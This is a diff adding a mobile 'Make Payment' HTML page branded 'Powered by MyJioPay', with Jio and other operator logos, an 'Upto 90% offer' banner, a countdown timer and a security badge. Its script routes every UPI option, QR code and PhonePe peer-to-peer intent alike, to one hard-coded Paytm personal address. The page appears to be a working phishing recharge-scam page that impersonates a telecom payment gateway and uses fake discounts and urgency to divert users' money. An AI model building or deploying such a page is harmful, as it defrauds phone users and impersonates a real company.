@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Gateway</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght=400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #f8fafc; }
+        .payment-box-container { background-color: #ffffff; border-radius: 24px; border: 1px solid #f1f5f9; box-shadow: 0 4px 18px rgba(0, 0, 0, 0.03); overflow: hidden; }
+        .upi-row { padding: 18px 16px; display: flex; flex-direction: column; transition: all 0.25s ease; cursor: pointer; }
+        #qrCanvasContainer img, #qrCanvasContainer canvas { margin: 0 auto; border: 4px solid #ffffff; box-shadow: 0 4px 12px rgba(0,0,0,0.06); border-radius: 12px; }
+    </style>
+</head>
+<body class="max-w-md mx-auto min-h-screen shadow-lg bg-[#f8fafc] flex flex-col justify-between relative select-none">
+
+    <div class="flex flex-col flex-1">
+        <div class="bg-white border-b border-gray-100 px-4 py-4 flex items-center justify-between shadow-sm">
+            <div class="flex items-center gap-3">
+                <i class="fa-solid fa-arrow-left text-gray-700 text-lg cursor-pointer" onclick="location.href='plans.html'"></i>
+                <h2 class="text-gray-900 font-extrabold text-[15px]"> Make Payment </h2>
+            </div>
+            <div class="bg-red-50 border border-red-200 text-red-600 px-2.5 py-1 rounded-md text-xs font-bold flex items-center gap-1">
+                <i class="fa-regular fa-clock animate-pulse"></i><span id="payTimer">05:00</span>
+            </div>
+        </div>
+
+        <!-- DYNAMIC AMOUNT CARD WITH WHITE LOGO CIRCLE AND +91 FORMAT -->
+        <div id="amountCardBox" class="text-white mx-4 mt-5 p-4 rounded-xl flex justify-between items-center transition-all">
+            <div>
+                <span class="text-[10px] font-bold uppercase text-slate-300 block mb-0.5">Payable Amount</span>
+                <span class="text-2xl font-black text-white" id="payAmount">₹0.00</span>
+            </div>
+            <div class="text-right border-l border-white/20 pl-4 flex items-center gap-3">
+                <div>
+                    <span class="text-[9px] bg-white/15 text-white border border-white/40 px-2 py-0.5 rounded-full font-extrabold uppercase inline-block mb-1">Special Active Offer</span>
+                    <!-- Number format updated with +91 -->
+                    <span class="text-sm font-bold text-white block font-mono" id="payMobile">+91 8488888888</span>
+                </div>
+                <!-- WHITE CIRCLE FOR SELECTED SIM LOGO -->
+                <div class="w-10 h-10 rounded-full bg-white border border-white flex items-center justify-center p-1.5 shadow-sm overflow-hidden flex-shrink-0">
+                    <img id="simDynamicWhiteLogo" src="" alt="Operator Brand" class="w-full h-full object-contain rounded-full">
+                </div>
+            </div>
+        </div>
+
+        <!-- DYNAMIC UPTO 90% LIVE OFFER ALERTS SECTION -->
+        <div id="premiumOfferAlert" class="mx-4 mt-3 rounded-xl p-3 border flex items-center justify-between shadow-xs bg-white/50 transition-all">
+            <div class="flex items-center gap-2">
+                <div class="w-2 h-2 rounded-full bg-amber-500 animate-ping"></div>
+                <p class="text-xs font-black uppercase tracking-wide text-amber-600">Upto 90% offer is live</p>
+            </div>
+            <span class="text-[9px] font-extrabold px-2 py-0.5 rounded uppercase tracking-wider text-white bg-amber-500 shadow-2xs">Verified</span>
+        </div>
+
+        <div class="px-4 mt-6">
+            <h3 class="text-[15px] font-bold text-gray-900 mb-1">UPI</h3>
+            <p class="text-xs text-gray-400 mb-3">Pay by any UPI app</p>
+            
+            <div class="payment-box-container">
+                <div id="row-phonepe" class="upi-row border-b border-gray-100" onclick="selectUpiOption('phonepe')">
+                    <div class="flex items-center justify-between w-full">
+                        <div class="flex items-center gap-3">
+                            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRe0N6bjzJ89P1KNnl9g-kueY850sUinE6Hj4HQkpCGqQ8OlY1BzUoFdXk&s=10" class="w-8 h-8 rounded-full border p-0.5 bg-white">
+                            <span class="text-sm font-semibold text-gray-800">PhonePe</span>
+                        </div>
+                        <input type="radio" name="upiApp" id="radio-phonepe" value="phonepe" class="w-4 h-4">
+                    </div>
+                    <div id="dropdown-phonepe" class="hidden mt-4 w-full">
+                        <button onclick="event.stopPropagation(); executeIntent();" class="w-full text-white font-bold py-3 rounded-xl text-sm btn-pay">Pay via PhonePe</button>
+                    </div>
+                </div>
+
+                <div id="row-paytm" class="upi-row border-b border-gray-100" onclick="selectUpiOption('paytm')">
+                    <div class="flex items-center justify-between w-full">
+                        <div class="flex items-center gap-3">
+                            <img src="https://images.seeklogo.com/logo-png/50/1/paytm-logo-png_seeklogo-501241.png" class="w-8 h-8 rounded-full border p-0.5 bg-white">
+                            <span class="text-sm font-semibold text-gray-800">Paytm</span>
+                        </div>
+                        <input type="radio" name="upiApp" id="radio-paytm" value="paytm" class="w-4 h-4">
+                    </div>
+                    <div id="dropdown-paytm" class="hidden mt-4 w-full">
+                        <button onclick="event.stopPropagation(); executeIntent();" class="w-full text-white font-bold py-3 rounded-xl text-sm btn-pay">Pay via Paytm</button>
+                    </div>
+                </div>
+
+                <div id="row-qr" class="upi-row border-b border-gray-100" onclick="selectUpiOption('qr')">
+                    <div class="flex items-center justify-between w-full">
+                        <div class="flex items-center gap-3">
+                            <div class="w-8 h-8 rounded-full border bg-slate-50 flex items-center justify-center"><i class="fa-solid fa-qrcode text-gray-600"></i></div>
+                            <span class="text-sm font-semibold text-gray-800">Pay via QR Code</span>
+                        </div>
+                        <input type="radio" name="upiApp" id="radio-qr" value="qr" class="w-4 h-4">
+                    </div>
+                    <div id="dropdown-qr" class="hidden mt-4 w-full flex flex-col items-center bg-slate-50/70 p-4 rounded-xl border border-dashed border-gray-200">
+                        <p class="text-[11px] text-gray-500 font-bold mb-3 uppercase">Scan this QR to make payment</p>
+                        <div id="qrCanvasContainer"></div>
+                        
+                    </div>
+                </div>
+
+                <div id="row-all" class="upi-row" onclick="selectUpiOption('all')">
+                    <div class="flex items-center justify-between w-full">
+                        <div class="flex items-center gap-3">
+                            <div class="w-8 h-8 rounded-full border bg-slate-50 flex items-center justify-center"><i class="fa-solid fa-wallet text-gray-600"></i></div>
+                            <span class="text-sm font-semibold text-gray-800">Pay via Other UPI</span>
+                        </div>
+                        <input type="radio" name="upiApp" id="radio-all" value="all" class="w-4 h-4">
+                    </div>
+                    <div id="dropdown-all" class="hidden mt-4 w-full">
+                        <button onclick="event.stopPropagation(); executeIntent();" class="w-full text-white font-bold py-3 rounded-xl text-sm btn-pay">Pay via Any UPI App</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- LOCKED JIO FOOTER -->
+    <footer class="mt-auto pt-8 pb-10 text-center px-6 flex flex-col items-center justify-center gap-2 border-t border-gray-100/80 bg-white mb-6">
+        <p class="text-[11px] text-gray-400 font-medium flex items-center justify-center gap-1">
+            <i class="fa-solid fa-shield-halved text-emerald-500"></i> 100% Secure 256-bit Encrypted Connection
+        </p>
+        <div class="flex items-center gap-1.5 opacity-85 mt-1 scale-95">
+            <span class="text-[10px] text-gray-400 font-bold uppercase tracking-wider">Powered by</span>
+            <div class="flex items-center bg-[#1e56e3] text-white px-2 py-0.5 rounded-md shadow-xs gap-1.5">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Reliance_Jio_Logo_%28October_2015%29.svg/960px-Reliance_Jio_Logo_%28October_2015%29.svg.png?_=20230708150838" alt="Jio Logo" class="w-3.5 h-3.5 rounded-full object-cover bg-white">
+                <span class="font-black text-[9px] tracking-tight font-sans">MyJioPay</span>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // GLOBAL UPI CONFIG
+        const upiAddress = "paytm.s30xge9@pty";
+        const merchantName = "JioRLNC9824";
+
+        const gradients = {
+            jio: 'from-[#1e56e3] to-[#1140bd]', airtel: 'from-[#e41b23] to-[#a30f14]',
+            vi: 'from-[#ff0000] to-[#990000]', bsnl: 'from-[#0a3a82] to-[#041c40]'
+        };
+        const colors = { jio: '#1e56e3', airtel: '#e41b23', vi: '#ff0000', bsnl: '#0a3a82' };
+
+        // Brand Assets mapping for Circle Box
+        const operatorWhiteLogos = {
+            jio: 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Reliance_Jio_Logo_%28October_2015%29.svg/960px-Reliance_Jio_Logo_%28October_2015%29.svg.png?_=20230708150838',
+            airtel: 'https://i.pinimg.com/736x/86/f4/d6/86f4d647b439f5f07e04f6ec15790cd7.jpg',
+            vi: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS-TFjCBMUrr8Bu1MW4i1VrMwhzUhg1rfU7QdQSMeSIUQ&s=10',
+            bsnl: 'https://i.ibb.co/SZ0bgP5/Screenshot-2026-07-09-161947.png'
+        };
+
+        const mobile = localStorage.getItem('recharge_mobile') || '8488888888';
+        const operator = localStorage.getItem('recharge_operator') || 'jio';
+        const amount = localStorage.getItem('recharge_amount') || '399';
+        
+        let selectedApp = '';
+        let trId = '';
+
+        for(let i=0; i<13; i++) { trId += Math.floor(Math.random()*10).toString(); }
+
+        document.getElementById('payAmount').innerText = '₹' + amount;
+        
+        // Formatted to +91 securely
+        const cleanMobile = mobile.replace(/^\+91\s*/, '');
+        document.getElementById('payMobile').innerText = '+91 ' + cleanMobile;
+        
+        document.getElementById('amountCardBox').className = `text-white mx-4 mt-5 p-4 rounded-xl flex justify-between items-center transition-all bg-gradient-to-br ${gradients[operator]}`;
+
+        // RUN LOGO UPDATES & CUSTOM BORDER HIGHLIGHTS FOR PREMIUM LIVE OFFER BOX
+        document.getElementById('simDynamicWhiteLogo').src = operatorWhiteLogos[operator];
+        const alertBox = document.getElementById('premiumOfferAlert');
+        alertBox.style.borderColor = colors[operator] + '25';
+        alertBox.style.backgroundColor = colors[operator] + '07';
+
+        function selectUpiOption(app) {
+            selectedApp = app;
+            document.querySelectorAll('[id^="dropdown-"]').forEach(div => div.classList.add('hidden'));
+            document.querySelectorAll('.upi-row').forEach(row => row.classList.remove('bg-[#f8fafc]'));
+            
+            document.getElementById(`radio-${app}`).checked = true;
+            document.getElementById(`dropdown-${app}`).classList.remove('hidden');
+            document.getElementById(`row-${app}`).classList.add('bg-[#f8fafc]');
+
+            if(app === 'qr') {
+                const qrBox = document.getElementById("qrCanvasContainer");
+                qrBox.innerHTML = "";
+                const payload = `upi://pay?pa=${encodeURIComponent(upiAddress)}&pn=${encodeURIComponent(merchantName)}&am=${Number(amount).toFixed(2)}&cu=INR&mode=02&tr=${trId}`;
+                new QRCode(qrBox, { text: payload, width: 165, height: 165, colorDark : "#0f172a", colorLight : "#ffffff", correctLevel : QRCode.CorrectLevel.H });
+            }
+            document.querySelectorAll('.btn-pay').forEach(b => b.style.backgroundColor = colors[operator]);
+        }
+
+        function executeIntent() {
+            if(!selectedApp) return;
+            let url = "";
+            const fmtAmt = Number(amount).toFixed(2);
+            if(selectedApp === 'phonepe') {
+                const phonePeData = {
+                    contact: {
+                        name: "",
+                        vpa: upiAddress,
+                        type: "VPA"
+                    },
+                    p2pPaymentCheckoutParams: {
+                        note: "Recharge Now",
+                        isByDefaultKnownContact: true,
+                        initialAmount: Math.round(Number(amount) * 100),
+                        currency: "INR",
+                        checkoutType: "DEFAULT",
+                        transactionContext: "p2p"
+                    }
+                };
+
+                const encodedData = btoa(JSON.stringify(phonePeData));
+                url = `phonepe://native?data=${encodedData}&id=p2ppayment`;
+            } else if(selectedApp === 'paytm') {
+                url = `paytmmp://cash_wallet?pa=${encodeURIComponent(upiAddress)}&am=${fmtAmt}&pn=${encodeURIComponent(merchantName)}&cu=INR`;
+            } else {
+                url = `upi://pay?pa=${encodeURIComponent(upiAddress)}&pn=${encodeURIComponent(merchantName)}&am=${fmtAmt}&cu=INR&mode=02&tr=${trId}`;
+            }
+            window.location.href = url;
+            
+        }
+
+        // Timer
+        let pTime = 300;
+        setInterval(() => {
+            let min = Math.floor(pTime / 60); let sec = pTime % 60;
+            document.getElementById('payTimer').innerText = `${min < 10 ? '0'+min : min}:${sec < 10 ? '0'+sec : sec}`;
+            if(pTime<=0) { alert("Session Expired"); window.location.href='plans.html'; }
+            pTime--;
+        }, 1000);
+    </script>
+</body>
+</html>
